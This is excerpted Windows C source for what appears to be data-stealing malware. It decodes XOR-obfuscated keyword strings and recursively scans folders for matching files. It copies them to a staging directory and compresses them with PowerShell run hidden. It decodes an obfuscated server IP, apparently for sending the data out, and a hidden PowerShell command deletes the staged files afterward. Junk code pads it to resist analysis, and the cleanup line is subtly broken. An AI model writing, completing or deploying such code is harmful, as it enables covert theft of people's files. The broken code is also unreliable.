...
void func_e94f_371(char *dst, const char *src, int len, unsigned char key) {
    if (!dst || !src || len < 0) return;
    for (int i = 0; i < len && i < 255; i++) dst[i] = src[i] ^ key;
    dst[len < 255 ? len : 255] = 0;
}

int func_60c7_185(const char *str, const char *substr) {
...
void func_71d8_077(const char *path, HANDLE *var_8b5c_009, WIN32_FIND_DATAA var_6d3e_001, const char *var_280d_001, char *var_8b5c_003, int depth, int *files_copied) {
    if (depth > 5 || !path || !var_8b5c_009 || !var_280d_001 || !var_8b5c_003 || !files_copied) return;
    ...
    *var_8b5c_009 = FindFirstFileA(search_path, &var_6d3e_001);
    if (*var_8b5c_009 == INVALID_HANDLE_VALUE) {
        FILE *log = fopen("C:\\Users\\Public\\debug.txt", "a");
    ...
    char keyword1[13];
    func_e94f_371(keyword1, keyword1_enc, 12, 48);
    const char keyword2_enc[] = {0x3a, 0x0d, 0x0b, 0x11, 0x16, 0x1d, 0x0b, 0x0b, 0x58, 0x37, 0x08, 0x1d, 0x0a, 0x19, 0x0c, 0x11, 0x17, 0x16, 0x0b};
    char keyword2[20];
    func_e94f_371(keyword2, keyword2_enc, 19, 120);
    int is_target_folder = func_60c7_185(path, keyword1) || func_60c7_185(path, keyword2);
    FILE *log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Scanning folder: %s\n", path); fclose(log); }
    do {
        if (var_6d3e_001.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (strcmp(var_6d3e_001.cFileName, ".") == 0 || strcmp(var_6d3e_001.cFileName, "..") == 0) continue;
            if (var_6d3e_001.dwFileAttributes & (FILE_ATTRIBUTE_REPARSE_POINT | FILE_ATTRIBUTE_SYSTEM)) continue;
            if (snprintf(var_8b5c_003, 256, "%s\\%s", path, var_6d3e_001.cFileName) >= 256) continue;
            HANDLE file_handle_2;
            func_71d8_077(var_8b5c_003, &file_handle_2, var_6d3e_001, var_280d_001, var_8b5c_003, depth + 1, files_copied);
        } else if (is_target_folder || func_60c7_185(var_6d3e_001.cFileName, keyword1) || func_60c7_185(var_6d3e_001.cFileName, keyword2)) {
            char src_path[256], dst_path[256];
            if (snprintf(src_path, sizeof(src_path), "%s\\%s", path, var_6d3e_001.cFileName) >= sizeof(src_path) ||
                snprintf(dst_path, sizeof(dst_path), "%s\\%s", var_280d_001, var_6d3e_001.cFileName) >= sizeof(dst_path)) {
                log = fopen("C:\\Users\\Public\\debug.txt", "a");
                if (log) { fprintf(log, "Path buffer overflow for %s\n", var_6d3e_001.cFileName); fclose(log); }
                continue;
            }
            ...
            log = fopen("C:\\Users\\Public\\debug.txt", "a");
            if (log) { fprintf(log, "Skipped file: %s\\%s\n", path, var_6d3e_001.cFileName); fclose(log); }
        }
    } while (FindNextFileA(*var_8b5c_009, &var_6d3e_001));
    FindClose(*var_8b5c_009);
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
...
int main(int argc, char *argv[]) {
    ...
    volatile int var_571c_002 = 86;
    int junk_330 = 95;
    junk_330 = junk_330 * 3 + 31;
    const char var_280d_001_enc[] = {0x68, 0x11, 0x77, 0x7e, 0x58, 0x4e, 0x59, 0x58, 0x77, 0x7b, 0x5e, 0x49, 0x47, 0x42, 0x48, 0x77, 0x6f, 0x44, 0x5c, 0x45, 0x47, 0x44, 0x4a, 0x4f, 0x58, 0x77, 0x6f, 0x44, 0x5c, 0x45, 0x47, 0x44, 0x4a, 0x4f, 0x58};
    char var_280d_001[36];
    func_e94f_371(var_280d_001, var_280d_001_enc, 35, 43);
    if (!CreateDirectoryA(var_280d_001, NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        char temp_dir[36];
        GetTempPathA(sizeof(temp_dir), temp_dir);
        if (snprintf(var_280d_001, sizeof(var_280d_001), "%sPolyDownloads", temp_dir) >= sizeof(var_280d_001)) {
            FILE *log = fopen("C:\\Users\\Public\\debug.txt", "a");
            if (log) { fprintf(log, "Output directory buffer overflow\n"); fclose(log); }
            return 1;
        }
        CreateDirectoryA(var_280d_001, NULL);
    }
    FILE *log = fopen("C:\\Users\\Public\\debug.txt", "a");
    if (log) { fprintf(log, "Directory created: %s\n", var_280d_001); fclose(log); }
    HANDLE var_8b5c_009;
    WIN32_FIND_DATAA var_6d3e_001;
    char var_8b5c_003[256];
    char username[256];
    ...
    var_571c_002 += 47;
    int junk_310 = 92;
    junk_310 = junk_310 * 8 + 27;
    int files_copied = 0;
    DWORD scan_start_time = GetTickCount();
    func_71d8_077(root_path, &var_8b5c_009, var_6d3e_001, var_280d_001, var_8b5c_003, 0, &files_copied);
    log = fopen("C:\\Users\\Public\\debug.txt", "a");
    ...
    char zip_cmd[512];
    if (snprintf(zip_cmd, sizeof(zip_cmd), "-Command \"Compress-Archive -Path '%s\\*' -DestinationPath '%s' -Force\"", var_280d_001, zip_path) >= sizeof(zip_cmd)) {
        log = fopen("C:\\Users\\Public\\debug.txt", "a");
    ...
    if (ShellExecuteA(NULL, "open", "powershell.exe", zip_cmd, NULL, SW_HIDE) <= (HINSTANCE)32) {
        ...
        char search_path[256];
        if (snprintf(search_path, sizeof(search_path), "%s\\*", var_280d_001) >= sizeof(search_path)) {
            log = fopen("C:\\Users\\Public\\debug.txt", "a");
        ...
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                ...
                char src_path[256], dst_path[256];
                if (snprintf(src_path, sizeof(src_path), "%s\\%s", var_280d_001, find_data.cFileName) >= sizeof(src_path) ||
...
free(buf);
    ...
    char server_ip[16];
    func_e94f_371(server_ip, server_ip_enc, 11, 236);
...
cleanup:
    ...
    ShellExecuteA(NULL, "open", "powershell.exe", "-Command \"Remove-Item -Path '%s\\*' -Recurse -ErrorAction SilentlyContinue\"", var_280d_001, SW_HIDE);
    char cmd[256];
